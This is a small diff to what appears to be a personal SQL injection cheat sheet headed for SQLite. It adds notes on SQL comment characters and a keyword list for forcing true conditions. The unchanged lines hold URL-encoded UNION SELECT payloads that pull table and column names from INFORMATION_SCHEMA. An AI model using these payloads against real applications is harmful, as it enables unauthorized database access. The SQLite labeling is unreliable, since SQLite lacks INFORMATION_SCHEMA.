@@ -1,4 +1,10 @@
 # For SQLi (SQLite)
+Command characters are (#, /**/, ;, —)
+
+We can use the following code to make it true
+
+("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/")
+
 #### 0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
 #### 0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
 #### 0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
